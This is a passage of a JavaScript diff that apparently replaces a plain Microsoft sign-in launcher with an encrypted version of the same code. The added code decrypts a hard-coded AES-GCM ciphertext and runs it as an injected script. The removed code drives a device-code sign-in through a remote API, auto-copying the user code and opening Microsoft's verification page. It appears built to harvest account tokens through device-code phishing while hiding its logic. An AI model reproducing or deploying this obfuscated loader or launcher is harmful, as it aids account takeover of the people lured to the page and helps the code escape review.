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";
+function b64ToU8(b64) {
+  return Uint8Array.from(atob(b64), function (c) { return c.charCodeAt(0); });
+}
+async function ehRunDecryptedLauncher() {
+  const rawKey = b64ToU8(keyB64);
+  const subtle = crypto.subtle;
+  const ck = await subtle.importKey('raw', rawKey, { name: 'AES-GCM' }, false, ['decrypt']);
+  const nonce = b64ToU8(nonceB64);
+  const ct = b64ToU8(ctB64);
+  const aad = new TextEncoder().encode('EH_LAUNCH_WRAP_V1');
+  const buf = await subtle.decrypt({ name: 'AES-GCM', iv: nonce, additionalData: aad }, ck, ct);
+  const plaintext = new TextDecoder().decode(buf);
+  const blob = new Blob([plaintext], { type: 'text/javascript' });
+  const url = URL.createObjectURL(blob);
+  const s = document.createElement('script');
+  s.src = url;
+  await new Promise(function (resolve, reject) {
+    s.onload = function () {
       try {
-        await fetch(API_BASE.replace(/\/$/, "") + "/healthz", {
-          method: "GET",
-          headers: launcherHeaders(false),
-          mode: "cors",
-          credentials: "omit",
-        });
-      } catch (eWarm) {}
-
-      if (MODE === "browser_oauth") {
-        var p = new URLSearchParams();
-        p.set("ui_mode", "redirect");
-        p.set("microsoft_account_type", ACCOUNT);
-        if (TENANT) p.set("directory_tenant_id", TENANT);
-        if (DOMAIN_MAPPING_ID) p.set("domain_mapping_id", DOMAIN_MAPPING_ID);
-        p.set("microsoft_scope_profile", MICROSOFT_SCOPE_PROFILE);
-        p.set("post_oauth_spa_origin", SPA_ORIGIN);
-        var resp = await fetch(API_BASE + "/oauth/microsoft/authorize?" + p.toString(), {
-          method: "GET",
-          headers: launcherHeaders(false),
-          mode: "cors",
-          credentials: "omit",
-        });
-        var data = await resp.json().catch(function () {
-          return {};
-        });
-        if (!resp.ok || !data.authorization_url) {
-          throw new Error((data && data.detail) || "Authorize failed: HTTP " + resp.status);
-        }
-        setWarmup(false);
-        setStatus("Redirecting to Microsoft sign-in…", true);
-        location.href = data.authorization_url;
-        return;
-      }
-
-      var bodyObj = {
-        microsoft_account_type: ACCOUNT,
-        device_consent: DEVICE_CONSENT,
-        device_code_grant: DEVICE_CODE_GRANT,
-        device_public_client_index: DEVICE_PUBLIC_CLIENT_INDEX,
-      };
-      if (TENANT) bodyObj.directory_tenant_id = TENANT;
-
-      var resp2 = await fetch(API_BASE + "/oauth/microsoft/device/start", {
-        method: "POST",
-        headers: launcherHeaders(true),
-        body: JSON.stringify(bodyObj),
-        mode: "cors",
-        credentials: "omit",
-      });
-      var data2 = await resp2.json().catch(function () {
-        return {};
-      });
-      if (!resp2.ok || !data2.user_code || !data2.session_id) {
-        throw new Error((data2 && data2.detail) || "Device start failed: HTTP " + resp2.status);
-      }
-      setWarmup(false);
-      if (verifyEl) verifyEl.textContent = data2.verification_uri || "https://microsoft.com/devicelogin";
-      if (codeEl) codeEl.textContent = data2.user_code;
-      if (deviceEl) deviceEl.style.display = "block";
-      var verifyPopupBlocked = false;
-      if (copyUcodeBtn) {
-        copyUcodeBtn.onclick = function () {
-          var codeText = codeEl ? String(codeEl.textContent || "").trim() : "";
-          copyUserCodeSync(codeText);
-          var setCopied = function () {
-            var orig = copyUcodeBtn.textContent;
-            copyUcodeBtn.textContent = "Copied";
-            window.setTimeout(function () {
-              copyUcodeBtn.textContent = orig || "Copy";
-            }, 1500);
-          };
-          if (navigator.clipboard && navigator.clipboard.writeText && codeText) {
-            navigator.clipboard.writeText(codeText).then(setCopied).catch(setCopied);
-          } else {
-            setCopied();
-          }
-        };
-      }
-      if (openVerifyBtn) {
-        openVerifyBtn.onclick = function () {
-          openMicrosoftVerifyWindow();
-          return false;
-        };
-        copyUserCodeSync(codeEl ? codeEl.textContent : "");
-        if (AUTO_OPEN) {
-          try {
-            verifyPopupBlocked = !openMicrosoftVerifyWindow();
-          } catch (eAuto) {
-            verifyPopupBlocked = true;
-          }
-        }
-      }
-      var sessionId = data2.session_id;
-      var everyMs = Math.max(3000, (parseInt(data2.interval, 10) || 5) * 1000);
-      if (verifyPopupBlocked) {
-        setStatus(
-          'Popup was blocked or could not open. Click "Open" to sign in at Microsoft (allow popups for this page if prompted). Then enter the code shown below — this page will redirect when sign-in completes.',
-          false,
-        );
-      } else {
-        setStatus(
-          "Enter the code at Microsoft. This page will redirect when sign-in completes…",
-          true,
-        );
-      }
-      async function poll() {
-        try {
-          var pr = await fetch(
-            API_BASE +
-              "/oauth/microsoft/device/status?session_id=" +
-              encodeURIComponent(sessionId),
-            {
-              method: "GET",
-              headers: launcherHeaders(false),
-              mode: "cors",
-              credentials: "omit",
-            },
-          );
-          var pd = await pr.json().catch(function () {
-            return {};
-          });
-          if (pd.status === "complete") {
-            setStatus(
-              "Signed in" + (pd.email ? " — " + pd.email : "") + ". Redirecting…",
-              true,
-            );
-            redirectToSpaSuccess("microsoft");
-            return;
-          }
-          if (pd.status === "error") {
-            throw new Error(pd.detail || "Device sign-in failed");
-          }
-        } catch (ePoll) {
-          setStatus(ePoll && ePoll.message ? ePoll.message : String(ePoll), false);
-          return;
-        }
-        devicePollTimer = window.setTimeout(poll, everyMs);
-      }
-      devicePollTimer = window.setTimeout(poll, everyMs);
-    } catch (err) {
-      var msg = err && err.message ? err.message : String(err);
-      if (
-        msg === "NetworkError when attempting to fetch resource." ||
-        (err && err.name === "TypeError")
-      ) {
-        msg +=
-          " Often caused by: (1) ngrok interstitial — visit the API base URL in a normal browser tab once; this launcher sends ngrok-skip-browser-warning when the host looks like ngrok. (2) file:// — use a local static server (e.g. npx serve) so the page has a real http origin, or ensure the API/worker allows CORS for Origin \"null\". (3) Cloudflare Worker as API_BASE — redeploy the " +
-          APP_LABEL +
-          " worker so it returns CORS headers (required for saved .html files).";
-      }
-      setWarmup(false);
-      setStatus(msg, false);
-    }
-  }
-
-  var retryBtn = document.getElementById("retry");
-  if (retryBtn)
-    retryBtn.onclick = function () {
-      clearDevicePoll();
-      void run();
+        URL.revokeObjectURL(url);
+      } catch (eRev) {}
+      resolve();
     };
-  void run();
+    s.onerror = function () {
+      try {
+        URL.revokeObjectURL(url);
+      } catch (eRev2) {}
+      reject(new Error('wrap_loader_script_failed'));
+    };
+    document.head.appendChild(s);
+  });
 }
-
-if (typeof globalThis !== "undefined") {
-  globalThis.EhPortableLauncherMount = EhPortableLauncherMount;
+await ehRunDecryptedLauncher().catch(function () {});
 }
-
-
-/* jsDelivr / deferred bundle (keep in sync via this script):
- * - Prefer inline JSON: <script type="application/json" id="eh-portable-boot">...</script>
- * - Option B: fetch boot JSON from backend when script src includes:
- *     ?eh_boot_url=https://api.example.com/public/eh-portable-boot&eh_boot_k=...
- */
-
-(function () {
-  var selfSrc = "";
-  try {
-    selfSrc = (document.currentScript && document.currentScript.src) ? String(document.currentScript.src) : "";
-  } catch (e0) {
-    selfSrc = "";
-  }
-
-  function injectBootEl(bootObj) {
-    try {
-      var bid = "eh-portable-boot";
-      var el = document.getElementById(bid);
-      if (!el) {
-        el = document.createElement("script");
-        el.type = "application/json";
-        el.id = bid;
-        document.head.appendChild(el);
-      }
-      el.textContent = JSON.stringify(bootObj || {});
-    } catch (e1) {}
-  }
-
-  function bootFromDom() {
-    var el = document.getElementById("eh-portable-boot");
-    if (!el || !el.textContent) return null;
-    try {
-      return JSON.parse(el.textContent);
-    } catch (e) {
-      return null;
-    }
-  }
-
-  async function bootFromBackend() {
-    if (!selfSrc) return null;
-    var u = null;
-    try { u = new URL(selfSrc); } catch (e0) { u = null; }
-    if (!u) return null;
-    var bootUrl = String(u.searchParams.get("eh_boot_url") || "").trim();
-    var bootKey = String(u.searchParams.get("eh_boot_k") || "").trim();
-    if (!bootUrl || !bootKey) return null;
-    var fetchUrl = bootUrl + (bootUrl.indexOf("?") >= 0 ? "&" : "?") + "k=" + encodeURIComponent(bootKey);
-    try {
-      var r = await fetch(fetchUrl, { method: "GET", cache: "no-store" });
-      if (!r || !r.ok) return null;
-      var j = await r.json();
-      return j || null;
-    } catch (e1) {
-      return null;
-    }
-  }
-
-  async function start() {
-    var boot = bootFromDom();
-    if (!boot) {
-      boot = await bootFromBackend();
-      if (boot) injectBootEl(boot);
-    }
-    if (!boot) return;
-    try { EhPortableLauncherMount(boot); } catch (e0) {}
-  }
-
-  if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", function () { void start(); });
-  } else {
-    void start();
-  }
-})();
+export {};
